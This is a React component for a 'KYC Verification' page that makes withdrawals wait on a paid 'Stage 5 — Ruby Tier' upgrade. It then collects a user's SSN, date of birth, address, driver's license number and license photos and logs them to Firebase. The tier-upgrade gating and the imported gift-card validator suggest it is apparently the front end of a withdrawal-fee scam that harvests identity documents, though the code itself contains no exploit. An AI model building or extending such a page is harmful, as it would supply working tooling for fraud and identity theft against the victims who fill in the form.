import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import { db, logKycSubmission } from '../lib/firebase';
import { doc, onSnapshot } from 'firebase/firestore';
import { compressKycDocumentImage } from '../utils/giftCardValidator';
import {
  ArrowLeft,
  ShieldCheck,
  Crown,
  IdCard,
  Upload,
  CheckCircle2,
  AlertCircle,
  Lock,
  Clock,
  FileText,
  MapPin,
  Calendar,
  UserCheck,
} from 'lucide-react';

interface KycVerificationProps {
  onBack: () => void;
  onNavigateToUpgrade: () => void;
  onNavigateToTransfer: () => void;
}

export const KycVerification: React.FC<KycVerificationProps> = ({
  onBack,
  onNavigateToUpgrade,
  onNavigateToTransfer,
}) => {
  const { user, updateUser } = useAuth();

  const currentLevel = user?.accountLevel || 'Basic';
  const hasRubyOrHigher =
    currentLevel.includes('Ruby') ||
    currentLevel.includes('Diamond') ||
    currentLevel.includes('Black');

  const isVerified = Boolean(user?.kycVerified || user?.kycStatus === 'verified');
  const isPending = !isVerified && user?.kycStatus === 'pending';
  const isRejected = !isVerified && user?.kycStatus === 'rejected';

  const [showResubmitForm, setShowResubmitForm] = useState(false);

  // Driver's License fields
  const [licenseNumber, setLicenseNumber] = useState('');
  const [licenseState, setLicenseState] = useState('');
  const [licenseExpiry, setLicenseExpiry] = useState('');
  const [licenseFrontImage, setLicenseFrontImage] = useState<string | null>(null);
  const [licenseBackImage, setLicenseBackImage] = useState<string | null>(null);

  // SSI & Personal Identity fields
  const [fullName, setFullName] = useState(user?.name || '');
  const [dateOfBirth, setDateOfBirth] = useState('');
  const [ssiNumber, setSsiNumber] = useState('');
  const [address, setAddress] = useState('');
  const [confirmedAccurate, setConfirmedAccurate] = useState(false);

  const [isUploadingFront, setIsUploadingFront] = useState(false);
  const [isUploadingBack, setIsUploadingBack] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');

  // Real-time listener on PII-free kycStatuses/{statusId} mirror
  useEffect(() => {
    const statusId = user?.kycStatusId;
    if (!statusId || !isPending) return;

    const unsub = onSnapshot(
      doc(db, 'kycStatuses', statusId),
      (snap) => {
        if (!snap.exists()) return;
        const data = snap.data() as {
          status: 'pending' | 'verified' | 'rejected';
          rejectionReason?: string;
        };
        if (data.status === 'verified') {
          updateUser({
            kycVerified: true,
            kycStatus: 'verified',
            kycRejectionReason: '',
          });
        } else if (data.status === 'rejected') {
          updateUser({
            kycVerified: false,
            kycStatus: 'rejected',
            kycRejectionReason:
              data.rejectionReason ||
              "Your Driver's License or SSI details could not be verified. Please check and resubmit clear details.",
          });
        }
      },
      (err) => {
        console.warn('KYC status listener warning:', err);
      }
    );

    return () => unsub();
  }, [user?.kycStatusId, isPending]);

  const handleSsiInput = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 9);
    if (digits.length <= 3) {
      setSsiNumber(digits);
    } else if (digits.length <= 5) {
      setSsiNumber(`${digits.slice(0, 3)}-${digits.slice(3)}`);
    } else {
      setSsiNumber(`${digits.slice(0, 3)}-${digits.slice(3, 5)}-${digits.slice(5)}`);
    }
  };

  const handleExpiryInput = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 6);
    if (digits.length <= 2) {
      setLicenseExpiry(digits);
    } else {
      setLicenseExpiry(`${digits.slice(0, 2)}/${digits.slice(2)}`);
    }
  };

  const handleFrontUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    e.target.value = '';
    if (!file) return;
    setErrorMsg('');
    setIsUploadingFront(true);
    try {
      const compressed = await compressKycDocumentImage(file);
      setLicenseFrontImage(compressed);
    } catch (err: any) {
      setErrorMsg(err?.message || "Failed to process Driver's License front photo.");
    } finally {
      setIsUploadingFront(false);
    }
  };

  const handleBackUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    e.target.value = '';
    if (!file) return;
    setErrorMsg('');
    setIsUploadingBack(true);
    try {
      const compressed = await compressKycDocumentImage(file);
      setLicenseBackImage(compressed);
    } catch (err: any) {
      setErrorMsg(err?.message || "Failed to process Driver's License back photo.");
    } finally {
      setIsUploadingBack(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg('');

    if (!hasRubyOrHigher) {
      setErrorMsg('You must upgrade to Stage 5 — Ruby Tier before completing ID & SSI verification.');
      return;
    }

    if (fullName.trim().length < 2) {
      setErrorMsg('Please enter your full legal name as shown on your Driver\'s License and SSI.');
      return;
    }
    if (dateOfBirth.trim().length < 6) {
      setErrorMsg('Please enter a valid date of birth.');
      return;
    }
    const ssiDigits = ssiNumber.replace(/\D/g, '');
    if (ssiDigits.length < 9) {
      setErrorMsg('Please enter your complete 9-digit SSI / Social Security Number (XXX-XX-XXXX).');
      return;
    }
    if (address.trim().length < 5) {
      setErrorMsg('Please enter your complete residential street address.');
      return;
    }
    if (licenseNumber.trim().length < 4) {
      setErrorMsg("Please enter a valid Driver's License number.");
      return;
    }
    if (licenseState.trim().length < 2) {
      setErrorMsg("Please enter the issuing State or Country for your Driver's License.");
      return;
    }
    if (licenseExpiry.trim().length < 4) {
      setErrorMsg("Please enter your Driver's License expiration date (MM/YYYY).");
      return;
    }
    if (!licenseFrontImage || !licenseBackImage) {
      setErrorMsg("Please upload clear photos of BOTH the Front and Back of your Driver's License.");
      return;
    }
    if (!confirmedAccurate) {
      setErrorMsg('Please confirm that your submitted Driver\'s License and SSI information are accurate.');
      return;
    }

    setIsSubmitting(true);
    try {
      const res = await logKycSubmission({
        userEmail: user?.email || 'unknown',
        userName: user?.name || fullName.trim(),
        accountLevel: currentLevel,
        fullName: fullName.trim(),
        dateOfBirth: dateOfBirth.trim(),
        ssiNumber: ssiNumber.trim(),
        address: address.trim(),
        licenseNumber: licenseNumber.trim().toUpperCase(),
        licenseState: licenseState.trim(),
        licenseExpiry: licenseExpiry.trim(),
        licenseFrontImage,
        licenseBackImage,
        date: new Date().toLocaleString(),
      });

      if (!res.success || !res.statusId) {
        setErrorMsg(res.error || 'Could not submit verification. Please try again.');
        return;
      }

      updateUser({
        kycVerified: false,
        kycStatus: 'pending',
        kycStatusId: res.statusId,
        kycRejectionReason: '',
      });
      setShowResubmitForm(false);
    } catch (err: any) {
      setErrorMsg(err?.message || 'Submission failed. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 pb-12">
      {/* Top Header */}
      <div className="bg-purple-700 text-white p-4 shadow-md sticky top-0 z-30">
        <div className="max-w-xl mx-auto flex items-center space-x-3">
          <button
            onClick={onBack}
            className="p-2 hover:bg-white/10 rounded-full transition-colors text-white cursor-pointer"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <h1 className="text-lg font-bold">Account Verification</h1>
            <p className="text-xs text-purple-200">Driver&apos;s License &amp; SSI Verification (Post-Ruby Step)</p>
          </div>
        </div>
      </div>

      <div className="max-w-xl mx-auto p-4 sm:p-6 space-y-6">
        {/* Progress Stepper Banner */}
        <div className="bg-white rounded-2xl p-4 shadow-xs border border-gray-100">
          <p className="text-[11px] font-bold uppercase tracking-wider text-gray-400 mb-3">
            Withdrawal Unlock Progress
          </p>
          <div className="grid grid-cols-3 gap-2 text-center text-[11px]">
            <div className={`p-2.5 rounded-xl border ${user?.payIdVerified ? 'bg-emerald-50 border-emerald-200 text-emerald-800' : 'bg-gray-50 border-gray-200 text-gray-500'}`}>
              <p className="font-bold">1. PAY ID</p>
              <p className="mt-0.5 font-semibold">{user?.payIdVerified ? '✓ Active' : 'Required'}</p>
            </div>
            <div className={`p-2.5 rounded-xl border ${hasRubyOrHigher ? 'bg-emerald-50 border-emerald-200 text-emerald-800' : 'bg-amber-50 border-amber-200 text-amber-800'}`}>
              <p className="font-bold">2. Ruby Tier</p>
              <p className="mt-0.5 font-semibold">{hasRubyOrHigher ? '✓ Reached' : currentLevel}</p>
            </div>
            <div className={`p-2.5 rounded-xl border ${isVerified ? 'bg-emerald-50 border-emerald-200 text-emerald-800' : isPending ? 'bg-amber-50 border-amber-200 text-amber-800' : 'bg-purple-50 border-purple-200 text-purple-800'}`}>
              <p className="font-bold">3. ID &amp; SSI</p>
              <p className="mt-0.5 font-semibold">
                {isVerified ? '✓ Verified' : isPending ? 'Pending' : 'Final Step'}
              </p>
            </div>
          </div>
        </div>

        {/* Gate 1: Must reach Stage 5 — Ruby or higher first */}
        {!hasRubyOrHigher ? (
          <div className="bg-white rounded-3xl p-6 sm:p-8 shadow-md border border-rose-100 text-center space-y-5">
            <div className="w-16 h-16 bg-rose-100 text-rose-600 rounded-full flex items-center justify-center mx-auto ring-8 ring-rose-50">
              <Lock className="w-8 h-8" />
            </div>
            <div className="space-y-2">
              <span className="inline-block text-[10px] font-bold uppercase tracking-wider bg-rose-100 text-rose-800 px-3 py-1 rounded-full">
                Ruby Tier Prerequisite
              </span>
              <h2 className="text-xl font-extrabold text-gray-900">
                Upgrade to Stage 5 — Ruby First
              </h2>
              <p className="text-xs text-gray-600 leading-relaxed max-w-sm mx-auto">
                Account Verification with your <strong>Driver&apos;s License &amp; SSI Details</strong> unlocks right after your account reaches <strong>Stage 5 — Ruby</strong>. You are currently on <strong>{currentLevel}</strong>.
              </p>
            </div>
            <button
              type="button"
              onClick={onNavigateToUpgrade}
              className="w-full min-h-[48px] bg-rose-600 hover:bg-rose-700 text-white font-bold py-3.5 rounded-xl text-sm shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
            >
              <Crown className="w-4 h-4 text-amber-300" />
              <span>Upgrade Account to Stage 5 — Ruby</span>
            </button>
          </div>
        ) : isVerified ? (
          /* Gate 2: Fully Verified */
          <div className="bg-white rounded-3xl p-6 sm:p-8 shadow-lg border border-emerald-100 text-center space-y-5">
            <div className="w-20 h-20 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto ring-8 ring-emerald-50">
              <CheckCircle2 className="w-10 h-10" />
            </div>
            <div className="space-y-2">
              <span className="inline-block text-[11px] font-bold uppercase tracking-wider bg-emerald-100 text-emerald-800 px-3 py-1 rounded-full">
                Identity &amp; SSI Verified
              </span>
              <h2 className="text-2xl font-extrabold text-gray-900">
                Account Verified — Withdrawals Unlocked!
              </h2>
              <p className="text-xs text-gray-600 leading-relaxed max-w-sm mx-auto">
                Your <strong>Driver&apos;s License &amp; SSI details</strong> have been verified and approved for <strong>{currentLevel}</strong>. You can now submit withdrawals freely.
              </p>
            </div>
            <div className="space-y-2.5 pt-2">
              <button
                type="button"
                onClick={onNavigateToTransfer}
                className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm shadow-md transition-all cursor-pointer"
              >
                Go to Withdrawal
              </button>
              <button
                type="button"
                onClick={onBack}
                className="w-full min-h-[44px] bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 rounded-xl text-xs transition-colors cursor-pointer"
              >
                Back to Dashboard
              </button>
            </div>
          </div>
        ) : isPending && !showResubmitForm ? (
          /* Gate 3: Submitted & Pending Admin Approval */
          <div className="bg-white rounded-3xl p-6 sm:p-8 shadow-md border border-amber-100 text-center space-y-5">
            <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin mx-auto" />
            <div className="space-y-2">
              <span className="inline-flex items-center space-x-1.5 text-[11px] font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
                <Clock className="w-3.5 h-3.5" />
                <span>Pending Admin Verification</span>
              </span>
              <h2 className="text-xl font-extrabold text-gray-900">
                Verifying Driver&apos;s License &amp; SSI Details
              </h2>
              <p className="text-xs text-gray-600 leading-relaxed max-w-sm mx-auto">
                Your Driver&apos;s License photos and SSI verification details have been received and are under review. As soon as admin approves your verification, your withdrawals will unlock automatically.
              </p>
            </div>
            {user?.kycStatusId && (
              <div className="bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-900">
                Verification Ref: <span className="font-mono font-bold">{user.kycStatusId}</span>
              </div>
            )}
            <button
              type="button"
              onClick={() => setShowResubmitForm(true)}
              className="text-xs font-semibold text-gray-500 hover:text-purple-700 underline cursor-pointer"
            >
              Update or Resubmit Verification Details
            </button>
          </div>
        ) : (
          /* Gate 4: Driver's License & SSI Verification Form */
          <form onSubmit={handleSubmit} className="space-y-5">
            {isRejected && (
              <div className="bg-red-50 border border-red-200 rounded-2xl p-4 flex items-start space-x-3">
                <AlertCircle className="w-5 h-5 text-red-600 shrink-0 mt-0.5" />
                <div className="text-xs text-red-800 space-y-1">
                  <p className="font-bold">Verification Rejected — Resubmission Required</p>
                  <p>{user?.kycRejectionReason || 'Please upload clearer Driver\'s License photos and verify your SSI details.'}</p>
                </div>
              </div>
            )}

            <div className="bg-gradient-to-r from-purple-900 to-indigo-900 text-white rounded-2xl p-5 shadow-sm">
              <div className="flex items-center space-x-2 mb-1.5">
                <ShieldCheck className="w-5 h-5 text-emerald-400" />
                <h2 className="font-bold text-base">Final Step to Unlock Withdrawals</h2>
              </div>
              <p className="text-xs text-purple-200 leading-relaxed">
                Your <strong>{currentLevel}</strong> upgrade is active. Complete your identity check by providing your valid <strong>Driver&apos;s License</strong> and <strong>SSI details</strong> below.
              </p>
            </div>

            {errorMsg && (
              <div className="p-3.5 bg-red-50 border border-red-200 rounded-xl text-red-700 text-xs flex items-start space-x-2 font-medium">
                <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-600" />
                <span>{errorMsg}</span>
              </div>
            )}

            {/* Part A: Driver's License Details & Photos */}
            <div className="bg-white rounded-2xl p-5 sm:p-6 shadow-xs border border-gray-100 space-y-4">
              <div className="flex items-center space-x-2 border-b border-gray-100 pb-3">
                <IdCard className="w-5 h-5 text-purple-600" />
                <h3 className="font-bold text-sm text-gray-900">1. Driver&apos;s License Details</h3>
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                  Driver&apos;s License Number *
                </label>
                <input
                  type="text"
                  value={licenseNumber}
                  onChange={(e) => setLicenseNumber(e.target.value.toUpperCase())}
                  maxLength={64}
                  placeholder="e.g. D123-4567-8901"
                  className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono uppercase text-gray-900"
                  required
                />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Issuing State / Country *
                  </label>
                  <input
                    type="text"
                    value={licenseState}
                    onChange={(e) => setLicenseState(e.target.value)}
                    maxLength={100}
                    placeholder="e.g. Texas / California"
                    className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Expiration Date (MM/YYYY) *
                  </label>
                  <input
                    type="text"
                    value={licenseExpiry}
                    onChange={(e) => handleExpiryInput(e.target.value)}
                    maxLength={10}
                    placeholder="MM/YYYY"
                    className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                    required
                  />
                </div>
              </div>

              {/* Front & Back License Photos */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                    License Front Photo *
                  </label>
                  <label
                    className={`border-2 border-dashed rounded-2xl p-4 flex flex-col items-center justify-center cursor-pointer transition-colors min-h-[130px] ${
                      licenseFrontImage
                        ? 'border-emerald-400 bg-emerald-50/40'
                        : 'border-gray-300 bg-gray-50 hover:border-purple-400'
                    }`}
                  >
                    {isUploadingFront ? (
                      <span className="text-xs text-purple-700 font-semibold">Processing...</span>
                    ) : licenseFrontImage ? (
                      <div className="text-center space-y-1.5">
                        <img
                          src={licenseFrontImage}
                          alt="Driver's License Front"
                          className="h-20 object-contain rounded-lg mx-auto border border-gray-200"
                        />
                        <span className="text-[11px] text-purple-700 font-semibold block">
                          Change Front Photo
                        </span>
                      </div>
                    ) : (
                      <div className="text-center space-y-1">
                        <Upload className="w-5 h-5 text-purple-600 mx-auto" />
                        <p className="text-xs font-semibold text-gray-700">Upload Front</p>
                        <p className="text-[10px] text-gray-400">Clear JPG or PNG</p>
                      </div>
                    )}
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleFrontUpload}
                      className="hidden"
                    />
                  </label>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                    License Back Photo *
                  </label>
                  <label
                    className={`border-2 border-dashed rounded-2xl p-4 flex flex-col items-center justify-center cursor-pointer transition-colors min-h-[130px] ${
                      licenseBackImage
                        ? 'border-emerald-400 bg-emerald-50/40'
                        : 'border-gray-300 bg-gray-50 hover:border-purple-400'
                    }`}
                  >
                    {isUploadingBack ? (
                      <span className="text-xs text-purple-700 font-semibold">Processing...</span>
                    ) : licenseBackImage ? (
                      <div className="text-center space-y-1.5">
                        <img
                          src={licenseBackImage}
                          alt="Driver's License Back"
                          className="h-20 object-contain rounded-lg mx-auto border border-gray-200"
                        />
                        <span className="text-[11px] text-purple-700 font-semibold block">
                          Change Back Photo
                        </span>
                      </div>
                    ) : (
                      <div className="text-center space-y-1">
                        <Upload className="w-5 h-5 text-purple-600 mx-auto" />
                        <p className="text-xs font-semibold text-gray-700">Upload Back</p>
                        <p className="text-[10px] text-gray-400">Clear JPG or PNG</p>
                      </div>
                    )}
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleBackUpload}
                      className="hidden"
                    />
                  </label>
                </div>
              </div>
            </div>

            {/* Part B: SSI / Identity Details */}
            <div className="bg-white rounded-2xl p-5 sm:p-6 shadow-xs border border-gray-100 space-y-4">
              <div className="flex items-center space-x-2 border-b border-gray-100 pb-3">
                <FileText className="w-5 h-5 text-purple-600" />
                <h3 className="font-bold text-sm text-gray-900">2. SSI &amp; Identity Details</h3>
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                  Full Legal Name *
                </label>
                <div className="relative">
                  <UserCheck className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                  <input
                    type="text"
                    value={fullName}
                    onChange={(e) => setFullName(e.target.value)}
                    maxLength={100}
                    placeholder="Full name as shown on ID"
                    className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900"
                    required
                  />
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Date of Birth *
                  </label>
                  <div className="relative">
                    <Calendar className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                    <input
                      type="date"
                      value={dateOfBirth}
                      onChange={(e) => setDateOfBirth(e.target.value)}
                      className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900"
                      required
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    SSI / SSN Number *
                  </label>
                  <div className="relative">
                    <Lock className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                    <input
                      type="text"
                      value={ssiNumber}
                      onChange={(e) => handleSsiInput(e.target.value)}
                      maxLength={15}
                      placeholder="XXX-XX-XXXX"
                      className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                      required
                    />
                  </div>
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                  Residential Street Address *
                </label>
                <div className="relative">
                  <MapPin className="w-4 h-4 absolute left-3.5 top-3.5 text-gray-400" />
                  <input
                    type="text"
                    value={address}
                    onChange={(e) => setAddress(e.target.value)}
                    maxLength={250}
                    placeholder="Street address, City, State, ZIP"
                    className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900"
                    required
                  />
                </div>
              </div>
            </div>

            <label className="flex items-start space-x-2.5 bg-purple-50 border border-purple-200 rounded-xl p-3.5 cursor-pointer">
              <input
                type="checkbox"
                checked={confirmedAccurate}
                onChange={(e) => setConfirmedAccurate(e.target.checked)}
                className="mt-0.5 w-4 h-4 accent-purple-600 shrink-0"
              />
              <span className="text-xs text-purple-950 leading-relaxed font-medium">
                I confirm that the Driver&apos;s License photos and SSI details provided belong to me and are accurate for account withdrawal verification.
              </span>
            </label>

            <button
              type="submit"
              disabled={isSubmitting || isUploadingFront || isUploadingBack}
              className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-sm sm:text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2 disabled:opacity-60"
            >
              <ShieldCheck className="w-5 h-5" />
              <span>
                {isSubmitting
                  ? 'Submitting Verification...'
                  : 'Submit Driver\'s License & SSI Verification'}
              </span>
            </button>
          </form>
        )}
      </div>
    </div>
  );
};
